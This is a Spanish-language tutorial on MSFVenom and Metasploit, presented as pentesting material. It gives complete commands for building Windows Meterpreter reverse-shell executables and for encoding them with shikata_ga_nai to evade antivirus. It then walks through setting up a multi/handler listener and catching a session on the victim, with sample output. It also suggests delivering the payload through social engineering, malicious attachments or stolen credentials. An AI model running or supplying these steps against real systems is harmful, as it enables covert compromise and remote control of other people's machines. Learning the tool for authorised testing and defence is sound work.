# MSFVenom

**MSFVenom** es la **herramienta principal de Metasploit Framework para la generación de _payloads_**. Esta utilidad consolida las capacidades de sus predecesoras, `msfpayload` y `msfencode`, ofreciendo una solución unificada para **crear _payloads_ altamente personalizables y ofuscarlos** con el fin de evadir la detección por _software_ antivirus (AV).

> [Metasploit - MSFvenom -h](Metasploit%20-%20MSFvenom%20-h.md)
## **1. Funciones Principales de MSFVenom**

MSFVenom es indispensable para el _pentesting_ y las evaluaciones de seguridad, gracias a sus diversas funciones:

- **Generación de Payloads:** Permite la creación de una amplia gama de _payloads_, incluyendo _reverse shells_, _bind shells_ y sesiones de Meterpreter, entre otros.
- **Personalización de Payloads:** Facilita la configuración de parámetros esenciales como la dirección IP de escucha (`LHOST`), el puerto de escucha (`LPORT`) y otras opciones específicas del _payload_.
- **Codificación y Ofuscación:** Incorpora _encoders_ que transforman el _payload_ para dificultar su identificación por sistemas de seguridad, como antivirus o _firewalls_.
- **Especificación de Formatos:** Admite la generación de _payloads_ en múltiples formatos de salida, como ejecutables (`.exe`), _scripts_ (`.sh`, `.py`), archivos para dispositivos móviles (`.apk`) y muchos más.

---

## **2. Comando Básico de MSFVenom**

La sintaxis fundamental para generar un _payload_ con MSFVenom es la siguiente:

Bash

```bash
msfvenom -p <payload> LHOST=<tu_ip> LPORT=<tu_puerto> -f <formato> > <nombre_archivo>
```

### **Ejemplo Práctico:**

Para generar un _payload_ de tipo Meterpreter _reverse_tcp_ para sistemas Windows, que se conectará a tu máquina Kali Linux (`192.168.1.10`) en el puerto `4444`, y guardarlo como un ejecutable `shell.exe`:

Bash

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe
```

Este comando creará el archivo `shell.exe`. Cuando este ejecutable se lanza en el sistema de la víctima, intentará establecer una conexión inversa hacia tu máquina atacante, esperando en `192.168.1.10:4444`.

---

## **3. Opciones Avanzadas y Utilidades de MSFVenom**

MSFVenom ofrece funcionalidades adicionales para una mayor flexibilidad y capacidad de evasión:

- **Listar Payloads Disponibles:** Para explorar la lista completa de _payloads_ que puedes generar, utiliza el siguiente comando:
    
    Bash
    
    ```
    msfvenom --list payloads
    ```
    
- **Listar Formatos de Salida:** Para conocer todos los formatos en los que MSFVenom puede generar _payloads_ (ej., `exe`, `elf`, `apk`, `raw`), ejecuta:
    
    Bash
    
    ```
    msfvenom --list formats
    ```
    
- **Aplicar Encoders para Evasión de Antivirus:** Puedes codificar un _payload_ para mejorar sus posibilidades de evadir la detección. El _encoder_ `x86/shikata_ga_nai` es uno de los más conocidos por su capacidad de generar un _payload_ polimórfico (que cambia su _signature_ con cada codificación). El parámetro `-i` permite especificar el número de iteraciones de codificación.
    
    Bash
    
    ```
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > shell_enc.exe
    ```
    
    _(En este ejemplo, `-e` especifica el _encoder_ y `-i 5` indica que el _payload_ se codificará cinco veces para aumentar la ofuscación.)_


## **4. Uso de un Payload de MSFVenom con un Listener de Metasploit**

Una vez que has generado un **payload de _reverse shell_** (o Meterpreter _reverse_tcp_) con MSFVenom, el siguiente paso es configurar un **listener** en tu máquina atacante. Este listener es el que "escuchará" en un puerto específico, esperando que el payload que has inyectado en el sistema objetivo establezca una conexión de retorno. Cuando la víctima ejecuta el payload, se crea una sesión entre su máquina y la tuya.

El proceso generalmente sigue estos pasos:

### **Paso 1: Generar el Payload con MSFVenom**

Primero, creas el payload que la víctima ejecutará. Es crucial que los parámetros **`LHOST`** (tu IP local) y **`LPORT`** (el puerto que abrirá tu listener) coincidan con la configuración que usarás en Metasploit.

**Ejemplo:** Generar un `windows/meterpreter/reverse_tcp` como un ejecutable `.exe`.

Bash

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > /root/Desktop/payload.exe
```

- **`LHOST=192.168.1.50`**: Esta es la dirección IP de tu máquina Kali (o la máquina del atacante). El payload intentará conectarse a esta IP.
- **`LPORT=4444`**: Este es el puerto en tu máquina Kali donde el listener estará esperando la conexión.
- **`/root/Desktop/payload.exe`**: La ruta y el nombre donde se guardará el ejecutable.

### **Paso 2: Transferir el Payload a la Víctima**

Este es un paso crítico y varía según el escenario de ataque. Algunas formas comunes de transferir el payload incluyen:

- **Ingeniería Social:** Engañar al usuario para que descargue y ejecute el archivo (ej., un correo electrónico malicioso con un archivo adjunto).
- **Vulnerabilidades de Aplicaciones Web:** Subir el payload a un servidor web vulnerable.
- **Acceso Previo:** Si ya tienes algún tipo de acceso (ej., credenciales robadas), puedes transferir el archivo directamente.

### **Paso 3: Configurar el Listener en Metasploit**

Mientras el payload espera ser ejecutado en la víctima, debes configurar Metasploit para que actúe como listener. Esto se hace usando un módulo de tipo **`exploit/multi/handler`**. Este es un "exploit" genérico que solo espera una conexión, sin explotar activamente una vulnerabilidad.

1. **Iniciar Metasploit Console:**
    
    Bash
    
    ```
    msfconsole
    ```
    
2. **Usar el Handler Genérico:**
    
    Bash
    
    ```
    msf > use exploit/multi/handler
    ```
    
    El _prompt_ cambiará a `msf exploit(handler) >`.
    
3. Configurar el Payload del Listener:
    
    Es fundamental que el tipo de payload configurado en el listener coincida exactamente con el tipo de payload que generaste con MSFVenom.
    
    Bash
    
    ```
    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    ```
    
4. Configurar LHOST y LPORT del Listener:
    
    Estos deben ser los mismos valores que usaste al generar el payload con MSFVenom.
    
    Bash
    
    ```
    msf exploit(handler) > set LHOST 192.168.1.50
    LHOST => 192.168.1.50
    msf exploit(handler) > set LPORT 4444
    LPORT => 4444
    ```
    
5. Verificar Opciones:
    
    Siempre revisa que todo esté correcto.
    
    Bash
    
    ```
    msf exploit(handler) > show options
    ```
    
    Asegúrate de que `LHOST` y `LPORT` estén configurados y que `ExitOnSession` esté en `false` si quieres mantener el handler activo después de obtener una sesión.
    

### **Paso 4: Iniciar el Listener**

Ahora, le indicas a Metasploit que comience a escuchar.

Bash

```
msf exploit(handler) > exploit
# O también puedes usar:
# msf exploit(handler) > run
```

Metasploit mostrará un mensaje indicando que está iniciando el _reverse TCP handler_ en la IP y puerto especificados.

### **Paso 5: Ejecución del Payload por la Víctima y Obtención de la Sesión**

En este punto, la máquina atacante está "escuchando". Cuando la víctima, por cualquier medio (manual, automatizado, por ingeniería social), **ejecuta el archivo `payload.exe`**, este intentará conectarse a `192.168.1.50:4444`.

Si la conexión es exitosa, Metasploit detectará la conexión entrante y el listener se activará, resultando en la apertura de una **sesión** (ej., una sesión de Meterpreter).

Bash

```
# ... (Output del listener esperando) ...
[*] Started reverse TCP handler on 192.168.1.50:4444
[*] Sending stage (175600 bytes) to 192.168.1.101
[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.101:49876) at 2025-06-18 11:00:00 -0500

meterpreter >
```

¡Felicidades! Has establecido una sesión Meterpreter, y el _prompt_ cambiará a `meterpreter >`, dándote control sobre el sistema de la víctima. Desde aquí, puedes ejecutar comandos de post-explotación.

Este proceso es el corazón de muchas operaciones de _pentesting_ con Metasploit y MSFVenom.